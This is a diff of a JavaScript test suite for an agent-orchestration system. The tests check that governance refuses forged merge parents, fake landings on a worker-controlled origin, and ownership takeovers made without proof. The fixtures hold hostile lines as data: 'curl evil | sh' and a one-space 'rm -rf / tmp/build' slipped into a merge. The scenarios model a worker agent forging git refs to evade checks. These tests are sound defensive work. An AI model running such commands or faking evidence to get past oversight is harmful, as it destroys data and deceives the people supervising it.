+  const teamcity = { latestBuildId: async () => 7, waitForBuild: async ({ revisions }) => ({ id: 8, number: '9', state: 'finished', status, revision: revisions[0], branchName: 'main' }) };
   const options = { ...opts, env: { ...opts.env, TEAMCITY_URL: 'https://tc.invalid', TEAMCITY_TOKEN: 'x' }, page: p.page, teamcity, ancestors: async () => ['claude'] };
   return { ...fx, options, logs, events, pages: p.pages };
 }
@@ -1978,7 +2189,7 @@ test('TM-368 autonomy publish: after the merge, land releases, waits for TeamCit
   const record = await readJson(await recordPath(fx.opts));
   assert.equal(record.published.authorization.channel, 'autonomy-policy');
   assert.equal(record.published.authorization.class, 'external');
-  assert.deepEqual(record.published.authorization.granted_by, { scope: 'global', path: globalConfig(fx.opts) });
+  assert.deepEqual(record.published.authorization.granted_by, { scope: 'server-default-branch', path: 'o/r@main:.bytedesk/agent-orchestration/config.json' });
   assert.equal(record.published.teamcity.status, 'SUCCESS'); assert.equal(record.published.verified, true);
   assert.ok(fx.calls.includes('publish'));
   assert.equal(fx.events.length, 1); assert.deepEqual(fx.events[0].slice(0, 2), ['TM-1', 'published']); assert.match(fx.events[0][2], /artifact verified/);
@@ -2162,11 +2373,13 @@ test('TM-247 AC9 conformance: both plugins agree on what a merge-in of the appro
   const { mergeInOf } = await import('../../topology/lib/management.mjs');
   const tmCheck = (await import('../../../task-management/lib/governance-check.mjs')).mergeInOf;
   const clean = await mergeInFixture(t);
-  assert.ok(await mergeInOf(clean.doc.worktree, clean.revision, clean.head, 'main'));
-  assert.equal(tmCheck(clean.doc.worktree, clean.revision, clean.head, 'main'), true);
+  const srv = f => ({ gh: f.opts.gh, env: f.opts.env, home: f.opts.home });
+  const tmSrv = f => ({ onServer: (_root, sha, branch) => ['ahead', 'identical'].includes(serverCompare(f.opts.consumer, sha, branch)) });
+  assert.ok(await mergeInOf(clean.doc.worktree, clean.revision, clean.head, 'main', srv(clean)));
+  assert.equal(tmCheck(clean.doc.worktree, clean.revision, clean.head, 'main', tmSrv(clean)), true);
   const evil = await mergeInFixture(t, { evil: true });
-  assert.equal(await mergeInOf(evil.doc.worktree, evil.revision, evil.head, 'main'), null, 'a merge that changes the task diff is not a merge-in');
-  assert.equal(tmCheck(evil.doc.worktree, evil.revision, evil.head, 'main'), false);
+  assert.equal(await mergeInOf(evil.doc.worktree, evil.revision, evil.head, 'main', srv(evil)), null, 'a merge that changes the task diff is not a merge-in');
+  assert.equal(tmCheck(evil.doc.worktree, evil.revision, evil.head, 'main', tmSrv(evil)), false);
   // A second parent that is not on the integration branch is not a merge-in either.
   await clean.git(clean.opts.consumer, ['checkout', '-q', '-b', 'stray', 'main~1']);
   await writeFile(join(clean.opts.consumer, 'stray.txt'), 'x'); await clean.git(clean.opts.consumer, ['add', 'stray.txt']);
@@ -2174,8 +2387,70 @@ test('TM-247 AC9 conformance: both plugins agree on what a merge-in of the appro
   await clean.git(clean.doc.worktree, ['reset', '-q', '--hard', clean.revision]);
   await clean.git(clean.doc.worktree, [...COMMIT.slice(0, 4), 'merge', '-q', '--no-ff', '-m', 'merge stray', 'stray']);
   const strayHead = (await clean.git(clean.doc.worktree, ['rev-parse', 'HEAD'])).stdout.trim();
-  assert.equal(await mergeInOf(clean.doc.worktree, clean.revision, strayHead, 'main'), null);
-  assert.equal(tmCheck(clean.doc.worktree, clean.revision, strayHead, 'main'), false);
+  assert.equal(await mergeInOf(clean.doc.worktree, clean.revision, strayHead, 'main', srv(clean)), null);
+  assert.equal(tmCheck(clean.doc.worktree, clean.revision, strayHead, 'main', tmSrv(clean)), false);
+});
+
+test('TM-441 conformance: a whitespace-only change inside the merge that alters behaviour is refused by both plugins', async t => {
+  const { mergeInOf } = await import('../../topology/lib/management.mjs');
+  const tmCheck = (await import('../../../task-management/lib/governance-check.mjs')).mergeInOf;
+  const root = await mkdtemp(join(tmpdir(), 'ao-merge-in-')); t.after(() => rm(root, { recursive: true, force: true }));
+  const repo = join(root, 'repo'), g = args => run('git', ['-C', repo, ...args]);
+  await run('git', ['init', '-q', '-b', 'main', repo]);
+  await writeFile(join(repo, 'README'), 'base\n'); await g(['add', '.']); await g([...COMMIT, '-m', 'base']);
+  await g(['checkout', '-q', '-b', 'task']);
+  await writeFile(join(repo, 'build.sh'), 'rm -rf /tmp/build\n'); await g(['add', '.']); await g([...COMMIT, '-m', 'approved']);
+  const revision = (await g(['rev-parse', 'HEAD'])).stdout.trim();
+  await g(['checkout', '-q', 'main']); await writeFile(join(repo, 'sibling.txt'), 'landed\n'); await g(['add', '.']); await g([...COMMIT, '-m', 'sibling']);
+  const mergeIn = async content => {
+    await g(['checkout', '-q', '--detach', revision]);
+    await g([...COMMIT.slice(0, 4), 'merge', '-q', '--no-ff', '--no-commit', 'main']);
+    if (content) { await writeFile(join(repo, 'build.sh'), content); await g(['add', 'build.sh']); }
+    await g([...COMMIT, '-m', 'merge main']);
+    return (await g(['rev-parse', 'HEAD'])).stdout.trim();
+  };
+  const server = { gh: fakeGh(repo), env: { ...process.env, AGENT_ORCHESTRATION_STATE_HOME: join(root, 'state') }, home: join(root, 'home') };
+  const tmServer = { onServer: (_root, sha, branch) => ['ahead', 'identical'].includes(serverCompare(repo, sha, branch)) };
+  const clean = await mergeIn(null);
+  assert.ok(await mergeInOf(repo, revision, clean, 'main', server), 'a clean merge-in is accepted');
+  assert.equal(tmCheck(repo, revision, clean, 'main', tmServer), true);
+  const evil = await mergeIn('rm -rf / tmp/build\n'); // one space: deletes / instead of /tmp/build
+  assert.equal(await mergeInOf(repo, revision, evil, 'main', server), null, 'agent-orchestration accepted a behaviour change hidden in the merge');
+  assert.equal(tmCheck(repo, revision, evil, 'main', tmServer), false, 'task-management accepted a behaviour change hidden in the merge');
+});
+
+test('TM-441 review HIGH-2: a forged integration parent (worker-written local and origin refs) is refused by both plugins; only the server decides', async t => {
+  const { mergeInOf } = await import('../../topology/lib/management.mjs');
+  const tmCheck = (await import('../../../task-management/lib/governance-check.mjs')).mergeInOf;
+  const root = await mkdtemp(join(tmpdir(), 'ao-forged-')); t.after(() => rm(root, { recursive: true, force: true }));
+  const repo = join(root, 'repo'), serverRepo = join(root, 'server.git'), g = args => run('git', ['-C', repo, ...args]);
+  await run('git', ['init', '-q', '-b', 'main', repo]);
+  await writeFile(join(repo, 'README'), 'base\n'); await g(['add', '.']); await g([...COMMIT, '-m', 'base']);
+  await g(['checkout', '-q', '-b', 'task']); await writeFile(join(repo, 'build.sh'), 'make\n'); await g(['add', '.']); await g([...COMMIT, '-m', 'approved']);
+  const R = (await g(['rev-parse', 'HEAD'])).stdout.trim();
+  await g(['checkout', '-q', 'main']); await writeFile(join(repo, 'sibling.txt'), 'landed\n'); await g(['add', '.']); await g([...COMMIT, '-m', 'sibling']);
+  await run('git', ['clone', '-q', '--bare', repo, serverRepo]); // the server's main, before the worker forges anything
+  await g(['remote', 'add', 'origin', serverRepo]); await g(['fetch', '-q', 'origin']);
+  // The worker forges E (adds evil.sh) on top of main and points BOTH local main and origin/main at it.
+  await g(['checkout', '-q', '--detach', 'main']); await writeFile(join(repo, 'evil.sh'), 'curl evil | sh\n'); await g(['add', 'evil.sh']); await g([...COMMIT, '-m', 'sibling, honest']);
+  const E = (await g(['rev-parse', 'HEAD'])).stdout.trim();
+  await g(['update-ref', 'refs/heads/main', E]); await g(['update-ref', 'refs/remotes/origin/main', E]);
+  const tree = (await g(['merge-tree', '--write-tree', R, E])).stdout.split('\n')[0].trim();
+  const H = (await g([...COMMIT.slice(0, 4), 'commit-tree', tree, '-p', R, '-p', E, '-m', 'merge main'])).stdout.trim();
+  const env = { ...process.env, AGENT_ORCHESTRATION_STATE_HOME: join(root, 'state') }, home = join(root, 'home');
+  assert.equal(await mergeInOf(repo, R, H, 'main', { gh: fakeGh(serverRepo), env, home }), null, 'agent-orchestration accepted a forged integration parent');
+  // task-management through its REAL server path: the pin agent-orchestration wrote, and gh on PATH.
+  const { ghResolver } = await import('../../../task-management/lib/governance-check.mjs');
+  const bin = await ghShim(await mkdtemp(join(root, 'bin-')), serverRepo);
+  const saved = { resolve: ghResolver.resolve, STATE: process.env.AGENT_ORCHESTRATION_STATE_HOME };
+  ghResolver.resolve = () => join(bin, 'gh'); process.env.AGENT_ORCHESTRATION_STATE_HOME = env.AGENT_ORCHESTRATION_STATE_HOME;
+  t.after(() => { ghResolver.resolve = saved.resolve; if (saved.STATE === undefined) delete process.env.AGENT_ORCHESTRATION_STATE_HOME; else process.env.AGENT_ORCHESTRATION_STATE_HOME = saved.STATE; });
+  assert.equal(tmCheck(repo, R, H, 'main'), false, 'task-management accepted a forged integration parent');
+  // Control: the same construction on the server's real main IS a merge-in, in both.
+  const realMain = (await run('git', ['-C', serverRepo, 'rev-parse', 'main'])).stdout.trim();
+  const honest = (await g([...COMMIT.slice(0, 4), 'commit-tree', (await g(['merge-tree', '--write-tree', R, realMain])).stdout.split('\n')[0].trim(), '-p', R, '-p', realMain, '-m', 'merge main'])).stdout.trim();
+  assert.ok(await mergeInOf(repo, R, honest, 'main', { gh: fakeGh(serverRepo), env, home }));
+  assert.equal(tmCheck(repo, R, honest, 'main'), true);
 });
 
 test('TM-247 AC9: a develop merge-in on the approved revision is eligible, lands, cleans up and passes governed completion', async t => {
@@ -2187,7 +2462,11 @@ test('TM-247 AC9: a develop merge-in on the approved revision is eligible, lands
   assert.equal(recorded.merge.revision, m.revision);
   const { governedCompletion } = await import('../../../task-management/lib/governance-check.mjs');
   const saved = process.env.AGENT_ORCHESTRATION_STATE_HOME; process.env.AGENT_ORCHESTRATION_STATE_HOME = m.opts.env.AGENT_ORCHESTRATION_STATE_HOME;
-  t.after(() => { if (saved === undefined) delete process.env.AGENT_ORCHESTRATION_STATE_HOME; else process.env.AGENT_ORCHESTRATION_STATE_HOME = saved; });
+  // PR #226 review: tm verifies the merge-in parent on the server through gh; the consumer stands in for it.
+  const { ghResolver } = await import('../../../task-management/lib/governance-check.mjs');
+  const shim = join(await ghShim(await mkdtemp(join(tmpdir(), 'ao-gh-')), m.opts.consumer), 'gh'), savedResolve = ghResolver.resolve;
+  ghResolver.resolve = () => shim;
+  t.after(() => { ghResolver.resolve = savedResolve; if (saved === undefined) delete process.env.AGENT_ORCHESTRATION_STATE_HOME; else process.env.AGENT_ORCHESTRATION_STATE_HOME = saved; });
   const task = { id: 'TM-1', worktree: recorded.worktree, branch: recorded.branch,
     governance: { version: 1, runtime: 'topology', workflowRunId: recorded.workflow_run_id, leadId: recorded.lead_id, revision: m.revision, state: 'ready-for-review' } };
   const gate = governedCompletion(task, { root: m.opts.consumer });
@@ -2218,6 +2497,7 @@ test('TM-247 AC10: record-landing resolves the target against origin after a fet
   await f.git(elsewhere, ['push', '-q', 'origin', 'main']);
   const landed = (await f.git(elsewhere, ['rev-parse', 'HEAD'])).stdout.trim();
   await f.git(f.opts.consumer, ['fetch', '-q', origin, landed]); // the commit exists locally; refs/heads/main does not have it
+  f.server.repo = origin; // the bare origin is the server
   const recorded = await recordLanding({ ...f.opts, actor: 'operator', reason: 'merged on the server', landed, reviewGate: fullReview(admitted.record, revision) });
   assert.equal(recorded.merge.landed, landed);
   assert.equal((await f.git(f.opts.consumer, ['rev-parse', 'main'])).stdout.trim(), landed, 'the local target was brought forward');
@@ -2275,6 +2555,59 @@ test('TM-247 AC7: a recorded ownership transfer moves the admission between lead
   assert.equal(state.owned, true, state.reason); assert.equal(state.active, false);
   // The new owner's claim then expires; a third lead may take over for itself.
   l.setClaim(null);
-  const taken = await transferTask({ ...l.actual, ...reason, owner: 'lead-3' });
+  // TM-459: a takeover needs the proven lead and a proven-absent owner (covered by its own test below).
+  const taken = await transferTask({ ...l.actual, ...reason, owner: 'lead-3', requireLead: async () => 'lead-3', ownerPresence: async () => null });
   assert.equal(taken.record.owner, 'lead-3'); assert.equal(claims.at(-1).steal, false);
+});
+
+// ── TM-459: a takeover needs lead proof and owner absence, never just a released claim ─────────────
+test('TM-459 transfer takeover: a released claim is not enough; the caller must be the proven lead and the owner proven gone', async t => {
+  const { opts, setClaim } = await fixture(t);
+  const { transferTask } = await import('../../topology/lib/management.mjs');
+  const { heartbeatDir, heartbeatPath } = await import('../../topology/lib/heartbeat.mjs');
+  const claims = [];
+  opts.store.claimFor = async (task, session) => { claims.push(session); setClaim({ session }); };
+  await admitTask(opts);
+  setClaim(null); // the owner ran `tm block` or `tm park`: its claim is released, and it is still alive
+  const binding = { serverKey: '/tmp/fixture-socket', paneId: '%7' };
+  let alive = true;
+  const live = { readCensusFn: async () => ({ agents: [{ agentId: 'author', binding }] }), listPanesFn: async ({ tmuxServer }) => (tmuxServer === binding.serverKey ? [{ paneId: '%7', alive }] : []) };
+  const take = extra => transferTask({ ...opts, reason: 'the lead left', owner: 'lead-3', ...live, ...extra });
+  // Not the repository's proven lead: refused, whatever the claim says.
+  await assert.rejects(take({ requireLead: async () => null }), { code: 'TOPOLOGY_MANAGEMENT_TRANSFER', message: /proven lead/ });
+  // The proven lead, but the owner's pane is live: refused.
+  await assert.rejects(take({ requireLead: async () => 'lead-3' }), { code: 'TOPOLOGY_MANAGEMENT_TRANSFER', message: /author is not proven absent \(it has a live pane %7\)/ });
+  // The pane is gone but the owner sent a fresh heartbeat: still refused.
+  alive = false;
+  await writeJson(heartbeatPath(heartbeatDir(opts.env, opts.home), '/other', '%9'), { serverKey: '/other', paneId: '%9', at: Date.now(), agent_id: 'author' });
+  await assert.rejects(take({ requireLead: async () => 'lead-3' }), { code: 'TOPOLOGY_MANAGEMENT_TRANSFER', message: /heartbeat/ });
+  assert.deepEqual(claims, [], 'no refusal moved the claim');
+  // Pane dead and heartbeat stale: the proven lead takes it over.
+  await writeJson(heartbeatPath(heartbeatDir(opts.env, opts.home), '/other', '%9'), { serverKey: '/other', paneId: '%9', at: Date.now() - 3_600_000, agent_id: 'author' });
+  const taken = await take({ requireLead: async () => 'lead-3' });
+  assert.equal(taken.record.owner, 'lead-3'); assert.deepEqual(claims, ['lead-3']);
+});
+
+// ── TM-472: record-landing under --authorized trusts the server, not a forged origin/<target> ───────
+test('TM-472 record-landing refuses a landing that is only on a worker-forged origin/main, even under --authorized', async t => {
+  const f = await fixture(t);
+  const admitted = await admitTask(f.opts); const revision = (await f.finish()).finish.revision;
+  const origin = join(f.opts.home, 'origin.git');
+  await mkdir(f.opts.home, { recursive: true });
+  await run('git', ['init', '-q', '--bare', origin]);
+  await f.git(f.opts.consumer, ['remote', 'add', 'origin', origin]);
+  await f.git(f.opts.consumer, ['push', '-q', 'origin', 'main']);
+  f.server.repo = origin; // the server never received the landing
+  // The worker fabricates a merge commit and points the local remote-tracking ref at it.
+  const tree = (await f.git(f.opts.consumer, ['rev-parse', `${revision}^{tree}`])).stdout.trim();
+  const fake = (await f.git(f.opts.consumer, [...COMMIT.slice(0, 4), 'commit-tree', tree, '-p', 'main', '-p', revision, '-m', 'merged, honestly'])).stdout.trim();
+  await f.git(f.opts.consumer, ['update-ref', 'refs/remotes/origin/main', fake]);
+  // ...and points origin at a repository it controls whose main IS the fake, so the host's fetch "confirms" it.
+  const forged = join(f.opts.home, 'forged.git');
+  await run('git', ['init', '-q', '--bare', forged]);
+  await f.git(f.opts.consumer, ['push', '-q', forged, `${fake}:refs/heads/main`]);
+  await f.git(f.opts.consumer, ['config', 'remote.origin.url', forged]);
+  await assert.rejects(recordLanding({ ...f.opts, authorized: true, actor: 'operator', reason: 'PR merged', landed: fake, reviewGate: fullReview(admitted.record, revision) }),
+    { code: 'TOPOLOGY_MANAGEMENT_TARGET', message: /not on the configured target branch main on the server \(compare says diverged\)/ });
+  assert.equal((await managementStatus(f.opts)).management.merge, undefined, 'nothing recorded');
 });
